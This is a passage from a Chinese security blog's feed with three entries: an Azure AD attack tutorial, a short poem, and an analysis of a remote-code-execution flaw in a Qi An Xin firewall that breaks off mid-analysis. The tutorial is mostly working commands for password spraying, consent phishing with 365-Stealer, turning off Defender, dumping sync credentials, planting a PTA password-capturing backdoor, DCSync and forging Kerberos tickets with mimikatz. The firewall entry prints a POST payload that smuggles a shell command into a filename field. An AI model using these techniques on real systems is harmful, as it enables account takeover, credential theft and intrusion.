class="hljs vim"><span class="hljs-keyword">cd</span> stormcollector<br><span class="hljs-keyword">python3</span> sscollector.pyz -h<br><span class="hljs-keyword">python3</span> sscollector.pyz cli<br><span class="hljs-keyword">python3</span> sscollector.pyz spn -t <span class="hljs-symbol">&lt;tenant&gt;</span> -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;clientID&gt;</span> -s <span class="hljs-symbol">&lt;clientSecret&gt;</span><br></code></pre></td></tr></table></figure><p>支持Azure CLI登录以及Client ID、Secret登录</p><p><img src="https://github.com/Azure/Stormspotter/raw/main/docs/screenshot2.png" alt="Screenshot2"></p><h4 id="列举子域"><a href="#列举子域" class="headerlink" title="列举子域"></a>列举子域</h4><p><a href="https://github.com/NetSPI/MicroBurst">NetSPI/<em>MicroBurst</em></a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">. C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1<br><span class="hljs-built_in">Invoke-EnumerateAzureSubDomains</span> <span class="hljs-literal">-Base</span> &lt;TENANT NAME&gt; <span class="hljs-literal">-Verbose</span><br>   <span class="hljs-comment"># Subdomain Service</span><br>   <span class="hljs-comment"># --------- -------</span><br>   <span class="hljs-comment"># &lt;TENANT NAME&gt;.mail.protection.outlook.com Email</span><br>   <span class="hljs-comment"># &lt;TENANT NAME&gt;.onmicrosoft.com Microsoft Hosted Domain</span><br></code></pre></td></tr></table></figure><h4 id="列举租户（Azure-AD-Powershell）"><a href="#列举租户（Azure-AD-Powershell）" class="headerlink" title="列举租户（Azure AD Powershell）"></a>列举租户（Azure AD Powershell）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> C:\Tools\AzureAD\AzureAD.psd1<br><span class="hljs-built_in">Import-Module</span> C:\Tools\AzureADPreview\AzureADPreview.psd1<br><span class="hljs-variable">$passwd</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;&lt;PASSWORD&gt;&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;test@&lt;TENANT NAME&gt;.onmicrosoft.com&quot;</span>, <span class="hljs-variable">$passwd</span>)<br><span class="hljs-built_in">Connect-AzureAD</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span><br><br><span class="hljs-built_in">Get-AzureADUser</span> <span class="hljs-literal">-All</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">Get-AzureADUser</span> <span class="hljs-literal">-All</span> <span class="hljs-variable">$true</span> | <span class="hljs-built_in">select</span> UserPrincipalName<br><span class="hljs-built_in">Get-AzureADGroup</span> <span class="hljs-literal">-All</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">Get-AzureADDevice</span><br><span class="hljs-built_in">Get-AzureADDirectoryRole</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;DisplayName eq &#x27;Global Administrator&#x27;&quot;</span> | <span class="hljs-built_in">Get-AzureADDirectoryRoleMember</span><br><span class="hljs-built_in">PS</span> AzureADPreview&gt; <span class="hljs-built_in">Get-AzureADMSRoleDefinition</span> | ?&#123;<span class="hljs-variable">$_</span>.IsBuiltin <span class="hljs-operator">-eq</span> <span class="hljs-variable">$False</span>&#125; | <span class="hljs-built_in">select</span> DisplayName<br></code></pre></td></tr></table></figure><h4 id="列举租户（az-cli）"><a href="#列举租户（az-cli）" class="headerlink" title="列举租户（az cli）"></a>列举租户（az cli）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">az login <span class="hljs-literal">-u</span> test<span class="hljs-selector-tag">@</span>&lt;TENANT NAME&gt;.onmicrosoft.com <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;<br>az vm list<br>az vm list -<span class="hljs-literal">-query</span> <span class="hljs-string">&quot;[].[name]&quot;</span> <span class="hljs-literal">-o</span> table<br>az webapp list<br>az functionapp list -<span class="hljs-literal">-query</span> <span class="hljs-string">&quot;[].[name]&quot;</span> <span class="hljs-literal">-o</span> table<br>az storage account list<br>az keyvault list<br></code></pre></td></tr></table></figure><h4 id="在线列举"><a href="#在线列举" class="headerlink" title="在线列举"></a>在线列举</h4><ul><li><p>联合Azure AD or O365</p>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://<span class="hljs-keyword">login</span>.microsoftonline.com/getuserrealm.srf?<span class="hljs-keyword">login</span>=&lt;<span class="hljs-keyword">USER</span>&gt;@&lt;<span class="hljs-keyword">DOMAIN</span>&gt;&amp;<span class="hljs-type">xml</span>=<span class="hljs-number">1</span><br>https://<span class="hljs-keyword">login</span>.microsoftonline.com/getuserrealm.srf?<span class="hljs-keyword">login</span>=root@&lt;TENANT <span class="hljs-type">NAME</span>&gt;.onmicrosoft.com&amp;<span class="hljs-type">xml</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>获取租户id</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>login.microsoftonline.com<span class="hljs-regexp">/&lt;DOMAIN&gt;/</span>.well-known/openid-configuration<br>https:<span class="hljs-regexp">//</span>login.microsoftonline.com<span class="hljs-regexp">/&lt;TENANT NAME&gt;.onmicrosoft.com/</span>.well-known/openid-configuration<br></code></pre></td></tr></table></figure></li></ul><h3 id="枚举与喷洒"><a href="#枚举与喷洒" class="headerlink" title="枚举与喷洒"></a>枚举与喷洒</h3><p>在传统的AD环境中，枚举与喷洒就是非常常见的攻击方式。作为TOP1的攻击方式，枚举与喷洒是作为没有相应的较高的权限以及shell作为立足点的情况下，成本较低也比较容易有惊喜产出的选择。</p><p>喷洒即为使用少数可能密码对大量用户进行尝试的攻击。而作为喷洒的基础，需要获得用户作为基础。一般会使用通过各种公众平台获得的用户名，而当没有较多可用账户时，枚举用户就成为攻击第一步。</p><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><p><a href="https://github.com/LMGsec/o365creeper">O365 Creeper</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt<br></code></pre></td></tr></table></figure><p>当你拥有有效凭据的时候，可通过该凭据获得凭据提取电子邮件列表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Install-Module</span> MSOnline<br><span class="hljs-built_in">Install-Module</span> AzureAD<br></code></pre></td></tr></table></figure><p>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\o365recon.ps1 -azure<br></code></pre></td></tr></table></figure><p><img src="https://camo.githubusercontent.com/dd6fb93e6f385e3113ff3ff88375beca8347ca5909070733a7f6c99f01e9080d/68747470733a2f2f7261772e6769746875622e636f6d2f6e79786765656b2f6f3336357265636f6e2f6d61737465722f73637265656e73686f742e706e673f" alt="截屏"></p><h4 id="喷洒"><a href="#喷洒" class="headerlink" title="喷洒"></a>喷洒</h4><p><a href="https://github.com/dafthack/MSOLSpra">MSOLSpra</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">. C:\Tools\MSOLSpray\MSOLSpray.ps1<br><span class="hljs-built_in">Invoke-MSOLSpray</span> <span class="hljs-literal">-UserList</span> C:\Tools\validemails.txt <span class="hljs-literal">-Password</span> &lt;PASSWORD&gt; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p><strong><em>默认情况下，Azure账户在尝试10次后就会锁定用户</em></strong></p><h3 id="非法授权获取"><a href="#非法授权获取" class="headerlink" title="非法授权获取"></a>非法授权获取</h3><p>攻击者创建一个 Azure 注册的应用程序，请求访问联系人、电子邮件或文档等数据。然后攻击者诱骗用户授权应用程序，以便攻击者可以访问目标用户有权访问的数据。</p><p>这种工具可以完美绕过MFA。</p><ul><li><p>查看用户是否有权限授权应用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole <span class="hljs-comment"># AzureADPreview</span><br></code></pre></td></tr></table></figure><ul><li><strong>禁用用户同意</strong>：用户不能授予应用程序权限。</li><li><strong>用户可以同意来自经过验证的发布者或您组织的应用程序，但仅限于您选择的权限</strong>：所有用户只能同意由经过验证的发布者发布的应用程序和在您的租户中注册的应用程序</li><li><strong>用户可以同意所有应用程序</strong>：允许所有用户授权。</li><li><strong>自定义应用同意政策</strong></li></ul></li></ul><h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><ol><li>登录<a href="https://portal.azure.com/">https://portal.azure.com</a> </li><li>点击<strong>应用注册</strong>&gt;<strong>新注册</strong></li><li>输入我们的应用程序的名称</li><li>在支持帐户类型下选择<strong>“任何组织目录中的帐户（任何 Azure AD 目录 - 多租户）”</strong></li><li>输入重定向的URL。此 URL 应指向我们用于托管网络钓鱼页面的 365-Stealer 应用程序。确保端点是<code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li><li>单击<strong>注册</strong>并保存<strong>应用程序 ID</strong></li></ol><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ol><li>点击 <code>Certificates &amp; secrets</code></li><li>单击 ，<code>New client secret</code>然后输入<strong>说明</strong>并单击<strong>添加</strong>。</li><li>保存<strong>secret</strong>的值。</li><li>单击 API 权限 &gt; 添加权限</li><li>单击 Microsoft Graph &gt;<strong>委派权限</strong></li><li>搜索并选择下面提到的权限，然后单击添加权限<ul><li>Contacts.Read</li><li>Mail.Read / Mail.ReadWrite</li><li>Mail.Send</li><li>Notes.Read.All</li><li>Mailboxsettings.ReadWrite</li><li>Files.ReadWrite.All</li><li>User.ReadBasic.All</li><li>User.Read</li></ul></li></ol><h4 id="365-stealer"><a href="#365-stealer" class="headerlink" title="365-stealer"></a>365-stealer</h4><p><em>默认端口是443</em></p><ul><li><p>运行 XAMPP 并启动 Apache</p></li><li><p>将 365-Stealer 克隆到 </p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\x</span>ampp<span class="hljs-symbol">\h</span>tdocs\<br></code></pre></td></tr></table></figure><ul><li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li></ul></li><li><p>条件</p><ul><li>python3</li><li>PHP CLI 或 Xampp 服务器</li><li><code>pip install -r requirements.txt</code></li></ul></li><li><p>启用 sqlite3 (Xampp &gt; Apache config &gt; php.ini) 并重启 Apache</p></li><li><p>可编辑 C:/xampp/htdocs/yourvictims/index.php 符合利用场景</p><ul><li>禁用 IP 白名单 <code>$enableIpWhiteList = false;</code></li></ul></li><li><p>转到 365-Stealer 管理门户 &gt; 配置（</p><p><a href="http://localhost:82/365-stealer/yourVictims">http://localhost:82/365-stealer/yourVictims</a></p><p>）</p><ul><li><strong>Client Id</strong> (Mandatory)：这将是我们注册的应用程序的 Application(Client) Id。</li><li><strong>Client Secret</strong> (Mandatory)：我们创建的 Certificates &amp; secrets 选项卡中的 Secret 值。</li><li><strong>重定向 URL</strong>（必填）：指定我们在注册应用程序时输入的重定向 URL，例如<code>https://&lt;Domain/IP&gt;/login/authorized</code></li><li><strong>宏位置</strong>：我们要注入的宏文件的路径。</li><li><strong>OneDrive 中的扩展</strong>：我们可以提供要从受害者帐户下载的文件扩展名，或者提供<code>*</code>下载受害者 OneDrive 中存在的所有文件的扩展名。文件扩展名应该用逗号分隔，如 txt、pdf、docx 等。</li><li><strong>延迟</strong>：通过在窃取时指定时间（以秒为单位）来延迟请求</li></ul></li><li><p>创建自签名证书以使用 HTTPS</p></li><li><p>运行应用程序，单击按钮或运行以下命令： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python 365-Stealer.py --run-app<br></code></pre></td></tr></table></figure><ul><li><code>--no-ssl</code>: 禁用HTTPS</li><li><code>--port</code>: 更改默认监听端口</li><li><code>--token</code>: 提供一个特定的令牌</li><li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>：使用刷新令牌</li></ul></li><li><p>找到网络钓鱼 URL：转到<code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code>并单击“<strong>阅读更多”</strong>按钮。</p></li></ul><h3 id="关于Token"><a href="#关于Token" class="headerlink" title="关于Token"></a>关于Token</h3><p>未完待续….（偷个懒别骂了555..）</p><h3 id="关于混合部署"><a href="#关于混合部署" class="headerlink" title="关于混合部署"></a>关于混合部署</h3><h4 id="Azure-AD-Connect"><a href="#Azure-AD-Connect" class="headerlink" title="Azure AD Connect"></a>Azure AD Connect</h4><p><em>参考文章：<a href="https://blog.xpnsec.com/azuread-connect-for-redteam">https://blog.xpnsec.com/azuread-connect-for-redteam</a></em></p><p>当需要同时部署本地AD与Azure AD时，我们就需要用到混合部署，Azure支持与本地AD实时同步，将本地AD的凭据应用于Azure AD。而一般本地AD与Azure AD进行连接的服务为 Azure AD Connect。</p><p>检查是否安装Azure Connect：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ADSyncConnector</span><br></code></pre></td></tr></table></figure><p>有多种方式将 Azure AD 配置为与现有的 Active Directory 部署集成。</p><ul><li><p>密码哈希同步 (PHS)</p><p>它将用户帐户和密码哈希从 AD 上传到 Azure</p></li><li><p>直通身份验证 (PTA)</p><p>它允许 Azure 将身份验证请求转发到本地 AD，而不依赖于上传哈希</p></li><li><p>联合身份验证</p><p>通过ADFS</p></li></ul><h4 id="针对不同部署的攻击"><a href="#针对不同部署的攻击" class="headerlink" title="针对不同部署的攻击"></a>针对不同部署的攻击</h4><ul><li>对于<strong>PHS</strong>，我们可以提取凭据</li><li>对于<strong>PTA</strong>，我们可以安装代理</li><li>对于<strong>联合部署</strong>，我们可以使用 DA 从 ADFS 服务器中提取证书</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span><br>&gt; <span class="hljs-built_in">Copy-Item</span> <span class="hljs-literal">-ToSession</span> <span class="hljs-variable">$adcnct</span> <span class="hljs-literal">-Path</span> C:\Tools\AADInternals.<span class="hljs-number">0.4</span>.<span class="hljs-number">5</span>.zip <span class="hljs-literal">-Destination</span> C:\Users\Administrator\Documents<br>&gt; <span class="hljs-built_in">Expand-Archive</span> C:\Users\Administrator\Documents\AADInternals.<span class="hljs-number">0.4</span>.<span class="hljs-number">5</span>.zip <span class="hljs-literal">-DestinationPath</span> C:\Users\Administrator\Documents\AADInternals<br>&gt; <span class="hljs-built_in">Import-Module</span> C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1<br>&gt; <span class="hljs-built_in">Get-AADIntSyncCredentials</span><br><br><span class="hljs-comment"># Get Token for SYNC account and reset on-prem admin password</span><br>&gt; <span class="hljs-variable">$passwd</span> = ConvertToSecureString <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br>&gt; <span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;&lt;Username&gt;@&lt;TenantName&gt;.onmicrosoft.com&quot;</span>, <span class="hljs-variable">$passwd</span>)<br>&gt; GetAADIntAccessTokenForAADGraph <span class="hljs-literal">-Credentials</span> <span class="hljs-variable">$creds</span> –SaveToCache<br>&gt; <span class="hljs-built_in">Get-AADIntUser</span> <span class="hljs-literal">-UserPrincipalName</span> onpremadmin@defcorpsecure.onmicrosoft.com | <span class="hljs-built_in">select</span> ImmutableId<br>&gt; <span class="hljs-built_in">Set-AADIntUserPassword</span> <span class="hljs-literal">-SourceAnchor</span> <span class="hljs-string">&quot;&lt;IMMUTABLE-ID&gt;&quot;</span> <span class="hljs-literal">-Password</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p>检查PTA是否安装：<code>Get-Command -Module PassthroughAuthPSModule</code></p><p>安装PTA后门：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># AADInternals</span><br><span class="hljs-built_in">Install-AADIntPTASpy</span><br><span class="hljs-built_in">Get-AADIntPTASpyLog</span> <span class="hljs-literal">-DecodePasswords</span><br></code></pre></td></tr></table></figure><h4 id="密码提取"><a href="#密码提取" class="headerlink" title="密码提取"></a>密码提取</h4><p>ADSync服务存储的凭据：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">C:\<span class="hljs-function"><span class="hljs-keyword">Program</span></span> Files\Microsoft Azure AD <span class="hljs-built_in">Sync</span>\<span class="hljs-keyword">Data</span>\ADSync.mdf<br></code></pre></td></tr></table></figure><table><thead><tr><th>工具</th><th>需要在目标上执行代码</th><th>DLL 依赖</th><th>本地需要 MSSQL</th><th>本地需要python</th></tr></thead><tbody><tr><td>ADSyncDecrypt</td><td>是</td><td>是</td><td>否</td><td>否</td></tr><tr><td>ADSyncGather</td><td>是</td><td>否</td><td>否</td><td>是</td></tr><tr><td>ADSyncQuery</td><td>否（仅限网络 RPC 调用）</td><td>否</td><td>是</td><td>是</td></tr></tbody></table><p><a href="https://github.com/fox-it/adconnectdump">fox-it/<em>adconnectdump</em></a> 该工具可以用于dump Azure AD Connect 上的凭据</p><h4 id="MSOL-Dcsync"><a href="#MSOL-Dcsync" class="headerlink" title="MSOL Dcsync"></a>MSOL Dcsync</h4><p>安装Azure Connect 服务将会自动安装 <code>MSOL_04tg03g043534（后面是随机hex）</code> 用户，该用户需要在域管组内或具有对目录的可写权限，大部分情况具有 DCSync 权限。</p><p>当你控制了Azure Connect 服务器后，可通过mimikatz转储该用户明文。</p><p>或者使用 XPN 的脚本：<a href="https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c">https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</a></p><h4 id="无缝SSO银票"><a href="#无缝SSO银票" class="headerlink" title="无缝SSO银票"></a>无缝SSO银票</h4><ul><li>如果没有 MFA的话，任何可以修改 AZUREADSSOACCS$ 帐户属性的人都可以使用 Kerberos 模拟 Azure AD 中的任何用户</li><li>PHS 和 PTA 都支持无缝 SSO。如果启用了无缝 SSO，<strong>则会</strong>在本地 AD 中创建一个计算机帐户<strong>AZUREADSSOC$</strong></li></ul><p><strong><em>注：AZUREADSSOACC 帐户的密码永远不会更改。</em></strong></p><p>使用 <a href="https://autologon.microsoftazuread-sso.com/">https://autologon.microsoftazuread-sso.com/</a> 将 Kerberos 票证转换为 Office 365 和 Azure 的 SAML 和 JWT</p><ol><li><p>使用mimikatz获取机器用户hash</p> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz.exe  <span class="hljs-string">&quot; lsadump::dcsync /user:AZUREADSSOACC<span class="hljs-variable">$</span> &quot;</span><br></code></pre></td></tr></table></figure></li><li><p>获取我们要模拟的用户的 AAD 登录名，例如<code>elrond@contoso.com</code>。这通常是他的 userPrincipalName 或来自本地 AD 的邮件属性</p></li><li><p>获取我们要模拟的用户的 SID，可通过域信息查看，例如<code>S-1-5-21-2121516926-2695913149-3163778339-111</code></p></li><li><p>创建银票</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.exe</span>  &quot; <span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::golden</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:elrond</span> <br>/<span class="hljs-selector-tag">sid</span><span class="hljs-selector-pseudo">:S-1-5-21-2121516926-2695913149-3163778339</span> /<span class="hljs-selector-tag">id</span><span class="hljs-selector-pseudo">:111</span> <br>/<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:contoso.local</span> /<span class="hljs-selector-tag">rc4</span>: <br><span class="hljs-selector-tag">f9969e088b30dc7dc7dc7dc7dc7333333333</span> <span class="hljs-selector-class">.nsatc</span><span class="hljs-selector-class">.net</span> /<span class="hljs-selector-tag">service</span><span class="hljs-selector-pseudo">:HTTP</span> /<span class="hljs-selector-tag">ptt</span> &quot;<br></code></pre></td></tr></table></figure></li><li><p>启动 Mozilla Firefox</p></li><li><p>转到 about:config 并设置<code>network.negotiate-auth.trusted-uris preference</code> 的值为<code>https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></p></li><li><p>导航到与我们的 AAD 域集成的任何 Web 应用程序。填写用户名，同时将密码字段留空。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Azure AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>现在是，凌晨三点二十三分</title>
    <link href="/2021/05/02/%E7%8E%B0%E5%9C%A8%E6%98%AF%EF%BC%8C%E5%87%8C%E6%99%A8%E4%B8%89%E7%82%B9%E4%BA%8C%E5%8D%81%E4%B8%89%E5%88%86/"/>
    <url>/2021/05/02/%E7%8E%B0%E5%9C%A8%E6%98%AF%EF%BC%8C%E5%87%8C%E6%99%A8%E4%B8%89%E7%82%B9%E4%BA%8C%E5%8D%81%E4%B8%89%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="现在是，凌晨三点二十三分"><a href="#现在是，凌晨三点二十三分" class="headerlink" title="现在是，凌晨三点二十三分"></a>现在是，凌晨三点二十三分</h1><p>现在是，凌晨三点二十三分。</p><p>喃喃低语着的，</p><p>怯懦的风声。</p><p>老旧的楼房，</p><p>青苔盘踞着皲裂的砖。</p><p>零星的灯光，</p><p>是今夜孤独的点缀。</p><p>死去的天空，</p><p>等待着黎明的火葬场。</p><p>是谁，</p><p>在等着明天。</p>]]></content>
    
    
    <categories>
      
      <category>牢骚</category>
      
    </categories>
    
    
    <tags>
      
      <tag>牢骚</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>奇安信NS-NGFW防火墙前台rce分析</title>
    <link href="/2021/04/15/%E5%A5%87%E5%AE%89%E4%BF%A1NS-NGFW%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0rce%E5%88%86%E6%9E%90/"/>
    <url>/2021/04/15/%E5%A5%87%E5%AE%89%E4%BF%A1NS-NGFW%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0rce%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="奇安信NS-NGFW防火墙前台rce分析"><a href="#奇安信NS-NGFW防火墙前台rce分析" class="headerlink" title="奇安信NS-NGFW防火墙前台rce分析"></a>奇安信NS-NGFW防火墙前台rce分析</h1><p>最近hw行动愈演愈烈，漏洞也是层出不穷，之前爆出了网康防火墙的rce，就分析一下</p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>这次漏洞又是前台无条件rce，影响就还是挺大的。</p><p><img src="/img/article2/image-20210414220702607.png" alt="image-20210414220702607"></p><h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><h3 id="网上的poc"><a href="#网上的poc" class="headerlink" title="网上的poc"></a>网上的poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/directdata/direct/router</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=nhqa43j0v61u6mtgkskkf235q7; ys-active_page=s%3A<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>160<br><br>&#123;<br>    &quot;action&quot;: &quot;SSLVPN_Resource&quot;,<br>    &quot;method&quot;: &quot;deleteImage&quot;,<br>    &quot;data&quot;:[&#123;<br>     &quot;data&quot;:[&quot;/var/www/html/b.txt;echo&#x27;fa3a6469&#x27;&gt;/var/www/html/fa3a6.txt&quot;]<br>    &#125;],<br>    &quot;type&quot;: &quot;rpc&quot;,<br>    &quot;tid&quot;: 17<br>&#125;<br></code></pre></td></tr></table></figure><p>post请求部分如上，可以很明显的看出是一个命令注入的漏洞。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据漏洞我们就可以结合代码进行分析</p><p>首先根据路由，找到 <code>/directdata/direct/router</code> 这个请求的内容</p><p><img src="/img/article2/image-20210415023027400.png" alt="image-20210415023027400"></p><p>发现调用了 <code>Ext_Direct</code> 类的 <code>run</code> 方法，发现这个类的作用是直接调用模板内的方法，继续跟进</p><p><img src="/img/article2/image-20210415023210498.png" alt="image-20210415023210498"></p><p>开头调用了 <code>Ext_Direct_Request</code> 类解析请求</p><p><img src="/img/article2/image-20210415023755850.png" alt="image-20210415023755850"></p><p><img src="/img/article2/image-20210415023804373.png" alt="image-20210415023804373"></p><p>发现这个方法解析了请求体，他做的操作是先调用 <code>json_decode</code> 解析json，会返回一个对象，然后一次解析请求的类名、方法名、参数名。</p><p><img src="/img/article2/image-20210415024006387.png" alt="image-20210415024006387"></p><p>并通过 <code>call_user_func_array</code> 调用方法，传递参数。</p><p>那这个漏洞的利用就很明了， <code>DirectController.php</code> 这个控制器存在未授权的问题，导致攻击者可以利用他调用任意模板。</p><p>那我们就可以对poc进行分析：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SSLVPN_Resource&quot;</span>,<br>    <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;deleteImage&quot;</span>,<br>    <span class="hljs-string">&quot;data&quot;</span>:[&#123;<br>     <span class="hljs-string">&quot;data&quot;</span>:[<span class="hljs-string">&quot;/var/www/html/b.txt;echo&#x27;fa3a6469&#x27;&gt;/var/www/html/fa3a6.txt&quot;</span>]<br>    